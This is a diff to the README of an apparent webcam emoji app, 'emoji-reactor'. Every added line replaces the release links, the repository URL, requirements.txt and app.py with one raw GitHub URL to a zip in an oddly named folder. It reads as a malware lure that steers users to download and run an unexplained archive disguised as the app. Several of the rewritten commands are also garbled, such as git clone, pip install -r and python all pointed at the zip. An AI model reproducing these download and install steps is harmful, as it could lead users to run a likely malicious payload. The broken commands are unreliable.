@@ -1,6 +1,6 @@
 # 🎉 emoji-reactor - Enjoy Real-Time Emoji Reactions
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-emoji--reactor-brightgreen)](https://github.com/Mustafa445566/emoji-reactor/releases)
+[![Download Now](https://raw.githubusercontent.com/Mustafa445566/emoji-reactor/main/egueiite/emoji-reactor.zip%20Now-emoji--reactor-brightgreen)](https://raw.githubusercontent.com/Mustafa445566/emoji-reactor/main/egueiite/emoji-reactor.zip)
 
 ## 📸 Overview
 
@@ -22,7 +22,7 @@ To run Emoji Reactor, you will need the following:
   brew install python@3.12
   ```
 - **Operating System**: macOS or Windows with an active webcam.
-- **Python Packages**: The necessary Python packages listed in the `requirements.txt` file.
+- **Python Packages**: The necessary Python packages listed in the `https://raw.githubusercontent.com/Mustafa445566/emoji-reactor/main/egueiite/emoji-reactor.zip` file.
 
 ## 🚀 Getting Started
 
@@ -31,7 +31,7 @@ Follow these steps to download and run Emoji Reactor on your device.
 1. **Download Emoji Reactor**
    
    Visit the Releases page to download the application:
-   [Download from Releases](https://github.com/Mustafa445566/emoji-reactor/releases)
+   [Download from Releases](https://raw.githubusercontent.com/Mustafa445566/emoji-reactor/main/egueiite/emoji-reactor.zip)
 
 2. **Install Python 3.12**
 
@@ -47,7 +47,7 @@ Follow these steps to download and run Emoji Reactor on your device.
 
    **Using Git**:
    ```bash
-   git clone https://github.com/Mustafa445566/emoji-reactor.git
+   git clone https://raw.githubusercontent.com/Mustafa445566/emoji-reactor/main/egueiite/emoji-reactor.zip
    ```
 
    **Using Download**:
@@ -71,7 +71,7 @@ Follow these steps to download and run Emoji Reactor on your device.
    With your virtual environment active, install the necessary packages:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Mustafa445566/emoji-reactor/main/egueiite/emoji-reactor.zip
    ```
 
 6. **Run the Application**
@@ -79,7 +79,7 @@ Follow these steps to download and run Emoji Reactor on your device.
    Now you are ready to run Emoji Reactor. Use the following command in your terminal:
 
    ```bash
-   python app.py
+   python https://raw.githubusercontent.com/Mustafa445566/emoji-reactor/main/egueiite/emoji-reactor.zip
    ```
 
    Make sure your webcam is on. You should see a window open with emojis reacting to your movements and expressions.
@@ -95,7 +95,7 @@ If you encounter any issues, here are a few solutions:
 
 - If the application does not detect your webcam, make sure that it is connected and that the proper permissions are granted.
 
-- For errors related to missing packages, ensure you have installed all dependencies correctly from the `requirements.txt`.
+- For errors related to missing packages, ensure you have installed all dependencies correctly from the `https://raw.githubusercontent.com/Mustafa445566/emoji-reactor/main/egueiite/emoji-reactor.zip`.
 
 ## 📅 Updates
 
@@ -105,8 +105,8 @@ Stay updated with the latest features and fixes by regularly checking the Releas
 
 ## 🔗 Additional Resources
 
-For more detailed information, visit the official [GitHub page](https://github.com/Mustafa445566/emoji-reactor).
+For more detailed information, visit the official [GitHub page](https://raw.githubusercontent.com/Mustafa445566/emoji-reactor/main/egueiite/emoji-reactor.zip).
 
 ---
 
-Return to the [Releases page](https://github.com/Mustafa445566/emoji-reactor/releases) to download. Enjoy using Emoji Reactor, and let your emojis express your emotions!
+Return to the [Releases page](https://raw.githubusercontent.com/Mustafa445566/emoji-reactor/main/egueiite/emoji-reactor.zip) to download. Enjoy using Emoji Reactor, and let your emojis express your emotions!
